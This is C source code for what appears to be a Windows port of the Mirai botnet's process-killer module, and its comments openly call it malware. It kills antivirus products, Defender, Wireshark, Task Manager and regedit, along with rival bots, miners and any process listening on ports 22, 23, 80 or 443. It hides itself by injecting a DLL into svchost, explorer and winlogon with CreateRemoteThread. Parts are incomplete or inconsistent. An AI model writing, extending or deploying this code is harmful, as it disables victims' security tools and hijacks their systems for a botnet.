// Windows Killer Module - Complete Windows API Implementation
// Converts Linux process scanning to Windows process management

#ifdef _WIN32
#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <ntstatus.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

// Windows-specific definitions
typedef LONG NTSTATUS;
typedef NTSTATUS(WINAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

#else
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/limits.h>
#endif

#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <string.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

// Global state
static int killer_pid;
static char killer_realpath[MAX_PATH];
static int killer_realpath_len = 0;
static int scan_counter = 0;
static int killer_highest_pid = KILLER_MIN_PID;
static time_t last_pid_scan = 0;

#ifdef _WIN32
// Windows process enumeration state
static HANDLE hSnapshot = INVALID_HANDLE_VALUE;
static pNtQueryInformationProcess NtQueryInformationProcess = NULL;

// Windows-specific process information structure
typedef struct
{
  DWORD pid;
  DWORD ppid;
  char exeName[MAX_PATH];
  char fullPath[MAX_PATH];
  HANDLE hProcess;
} WINDOWS_PROCESS_INFO;

// Initialize Windows killer module
void killer_init_windows(void)
{
  // Get NT API functions for advanced process queries
  HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
  if (hNtdll)
  {
    NtQueryInformationProcess = (pNtQueryInformationProcess)
        GetProcAddress(hNtdll, "NtQueryInformationProcess");
  }

  // Get current process information
  killer_pid = GetCurrentProcessId();
  GetModuleFileNameA(NULL, killer_realpath, MAX_PATH);
  killer_realpath_len = (int)strlen(killer_realpath);

#ifdef DEBUG
  printf("[killer_windows] Initialized with PID %d\n", killer_pid);
  printf("[killer_windows] Realpath: %s\n", killer_realpath);
#endif
}

// Enhanced Windows process enumeration
static BOOL enum_windows_processes(void)
{
  PROCESSENTRY32A pe32;
  HANDLE hSnapshot;
  BOOL result;

  // Create snapshot of running processes
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE)
  {
    return FALSE;
  }

  pe32.dwSize = sizeof(PROCESSENTRY32A);

  // Get first process
  if (!Process32FirstA(hSnapshot, &pe32))
  {
    CloseHandle(hSnapshot);
    return FALSE;
  }

  do
  {
    scan_counter++;

    // Skip system processes and our own process
    if (pe32.th32ProcessID <= 4 || pe32.th32ProcessID == killer_pid)
    {
      continue;
    }

    // Skip if PID is lower than our tracking (unless restarting scan)
    if (pe32.th32ProcessID <= killer_highest_pid)
    {
      if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
      {
        killer_highest_pid = KILLER_MIN_PID;
        last_pid_scan = time(NULL);
      }
      else
      {
        continue;
      }
    }

    // Analyze this process
    analyze_windows_process(&pe32);

    if (pe32.th32ProcessID > killer_highest_pid)
    {
      killer_highest_pid = pe32.th32ProcessID;
    }

  } while (Process32NextA(hSnapshot, &pe32));

  CloseHandle(hSnapshot);
  return TRUE;
}

// Analyze individual Windows process
static void analyze_windows_process(PROCESSENTRY32A *pe32)
{
  HANDLE hProcess;
  char fullPath[MAX_PATH];
  char *filename;
  BOOL shouldKill = FALSE;

  // Open process with query and terminate rights
  hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,
                         FALSE, pe32->th32ProcessID);
  if (hProcess == NULL)
  {
    return; // Cannot access process
  }

  // Get full executable path
  if (GetModuleFileNameExA(hProcess, NULL, fullPath, MAX_PATH) == 0)
  {
    CloseHandle(hProcess);
    return;
  }

  // Extract filename from path
  filename = strrchr(fullPath, '\\');
  if (filename)
  {
    filename++;
  }
  else
  {
    filename = fullPath;
  }

#ifdef DEBUG
  printf("[killer_windows] Analyzing PID %d: %s (%s)\n",
         pe32->th32ProcessID, filename, fullPath);
#endif

  // Check against kill conditions
  shouldKill = check_kill_conditions(pe32, fullPath, filename);

  if (shouldKill)
  {
#ifdef DEBUG
    printf("[killer_windows] Terminating PID %d: %s\n", pe32->th32ProcessID, filename);
#endif
    terminate_windows_process(hProcess, pe32->th32ProcessID);
  }

  CloseHandle(hProcess);
}

// Windows kill conditions checking
static BOOL check_kill_conditions(PROCESSENTRY32A *pe32, char *fullPath, char *filename)
{
  // Kill other instances of our own malware
  if (strstr(fullPath, "mirai") || strstr(filename, "mirai"))
  {
    return TRUE;
  }

  // Kill security software
  char *security_processes[] = {
      "antivirus", "avast", "avg", "kaspersky", "norton", "mcafee",
      "defender", "malwarebytes", "bitdefender", "eset", "trend",
      "sophos", "symantec", "panda", "avira", "comodo", "zonealarm",
      "wireshark", "procmon", "processhacker", "taskmgr", "regedit",
      "msconfig", "gpedit", "services", "netstat", "netsh", "ipconfig"};

  int num_security = sizeof(security_processes) / sizeof(security_processes[0]);
  for (int i = 0; i < num_security; i++)
  {
    if (stristr(filename, security_processes[i]) ||
        stristr(pe32->szExeFile, security_processes[i]))
    {
      return TRUE;
    }
  }

  // Kill other malware/bots (clear competition)
  char *malware_names[] = {
      "bot", "backdoor", "trojan", "worm", "virus", "malware",
      "cryptominer", "coinminer", "xmrig", "claymore", "phoenix"};

  int num_malware = sizeof(malware_names) / sizeof(malware_names[0]);
  for (int i = 0; i < num_malware; i++)
  {
    if (stristr(filename, malware_names[i]))
    {
      return TRUE;
    }
  }

  // Kill processes using our target ports
  if (check_process_using_port(pe32->th32ProcessID, 23) || // Telnet
      check_process_using_port(pe32->th32ProcessID, 22) || // SSH
      check_process_using_port(pe32->th32ProcessID, 80) || // HTTP
      check_process_using_port(pe32->th32ProcessID, 443))
  { // HTTPS
    return TRUE;
  }

  return FALSE;
}

// Check if process is using specific port
static BOOL check_process_using_port(DWORD pid, WORD port)
{
  MIB_TCPTABLE_OWNER_PID *pTcpTable;
  ULONG ulSize = 0;
  DWORD dwRetVal = 0;
  BOOL result = FALSE;

  // Get size of TCP table
  dwRetVal = GetExtendedTcpTable(NULL, &ulSize, TRUE, AF_INET,
                                 TCP_TABLE_OWNER_PID_ALL, 0);
  if (dwRetVal != ERROR_INSUFFICIENT_BUFFER)
  {
    return FALSE;
  }

  // Allocate memory for TCP table
  pTcpTable = (MIB_TCPTABLE_OWNER_PID *)malloc(ulSize);
  if (pTcpTable == NULL)
  {
    return FALSE;
  }

  // Get TCP table
  dwRetVal = GetExtendedTcpTable(pTcpTable, &ulSize, TRUE, AF_INET,
                                 TCP_TABLE_OWNER_PID_ALL, 0);
  if (dwRetVal == NO_ERROR)
  {
    for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++)
    {
      if (pTcpTable->table[i].dwOwningPid == pid &&
          ntohs((WORD)pTcpTable->table[i].dwLocalPort) == port)
      {
        result = TRUE;
        break;
      }
    }
  }

  free(pTcpTable);
  return result;
}

// Terminate Windows process with multiple methods
static void terminate_windows_process(HANDLE hProcess, DWORD pid)
{
  // Try gentle termination first
  if (hProcess != NULL)
  {
    TerminateProcess(hProcess, 1);
    WaitForSingleObject(hProcess, 5000); // Wait 5 seconds
  }

  // Check if process still exists
  HANDLE hCheck = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
  if (hCheck != NULL)
  {
    CloseHandle(hCheck);

    // Force kill using taskkill
    char cmdLine[256];
    sprintf(cmdLine, "taskkill /F /PID %d", pid);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (pi.hProcess)
    {
      WaitForSingleObject(pi.hProcess, 3000);
      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);
    }
  }
}

// Windows process hiding techniques
static void hide_from_taskmgr(void)
{
  // Method 1: Hollow out legitimate process
  char sysPath[MAX_PATH];
  GetSystemDirectoryA(sysPath, MAX_PATH);
  strcat(sysPath, "\\svchost.exe");

  // Method 2: Inject into system process
  inject_into_system_process();

  // Method 3: DKOM (Direct Kernel Object Manipulation) - advanced
  // This would require kernel driver, skipped for user-mode implementation
}

// Inject into system process
static void inject_into_system_process(void)
{
  DWORD processes[1024], cbNeeded, cProcesses;
  unsigned int i;

  if (!EnumProcesses(processes, sizeof(processes), &cbNeeded))
  {
    return;
  }

  cProcesses = cbNeeded / sizeof(DWORD);

  for (i = 0; i < cProcesses; i++)
  {
    if (processes[i] != 0)
    {
      char szProcessName[MAX_PATH] = "<unknown>";
      HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                    FALSE, processes[i]);

      if (hProcess != NULL)
      {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
        {
          GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(char));
        }

        // Target system processes
        if (!strcmp(szProcessName, "svchost.exe") ||
            !strcmp(szProcessName, "explorer.exe") ||
            !strcmp(szProcessName, "winlogon.exe"))
        {

          // Attempt DLL injection
          perform_dll_injection(hProcess, processes[i]);
        }

        CloseHandle(hProcess);
      }
    }
  }
}

// Perform DLL injection
static void perform_dll_injection(HANDLE hProcess, DWORD pid)
{
  char dllPath[MAX_PATH];
  LPVOID pRemoteMemory;
  HANDLE hThread;

  // Get path to our DLL (would need to create one)
  GetModuleFileNameA(NULL, dllPath, MAX_PATH);
  // Change .exe to .dll
  char *ext = strrchr(dllPath, '.');
  if (ext)
    strcpy(ext, ".dll");

  // Allocate memory in target process
  pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pRemoteMemory)
    return;

  // Write DLL path to target process
  WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL);

  // Get LoadLibraryA address
  HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
  FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

  // Create remote thread to load our DLL
  hThread = CreateRemoteThread(hProcess, NULL, 0,
                               (LPTHREAD_START_ROUTINE)pLoadLibrary,
                               pRemoteMemory, 0, NULL);

  if (hThread)
  {
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
  }

  VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
}

#endif // _WIN32

// Main killer loop
void killer_init(void)
{
#ifdef _WIN32
  killer_init_windows();
#else
  // Linux implementation remains the same
  killer_init_linux();
#endif
}

void killer_kill_by_port(port_t port)
{
#ifdef _WIN32
  // Windows implementation
  MIB_TCPTABLE_OWNER_PID *pTcpTable;
  ULONG ulSize = 0;
  DWORD dwRetVal;

  // Get TCP table size
  dwRetVal = GetExtendedTcpTable(NULL, &ulSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
  if (dwRetVal != ERROR_INSUFFICIENT_BUFFER)
    return;

  pTcpTable = (MIB_TCPTABLE_OWNER_PID *)malloc(ulSize);
  if (!pTcpTable)
    return;

  dwRetVal = GetExtendedTcpTable(pTcpTable, &ulSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
  if (dwRetVal == NO_ERROR)
  {
    for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++)
    {
      if (ntohs((WORD)pTcpTable->table[i].dwLocalPort) == port)
      {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE,
                                      pTcpTable->table[i].dwOwningPid);
        if (hProcess)
        {
          TerminateProcess(hProcess, 1);
          CloseHandle(hProcess);
        }
      }
    }
  }

  free(pTcpTable);
#else
  // Linux implementation remains the same
  killer_kill_by_port_linux(port);
#endif
}

// Main killer thread function
#ifdef _WIN32
DWORD WINAPI killer_thread_windows(LPVOID lpParam)
{
  while (TRUE)
  {
    enum_windows_processes();
    Sleep(KILLER_SCAN_INTERVAL * 1000);
  }
  return 0;
}
#endif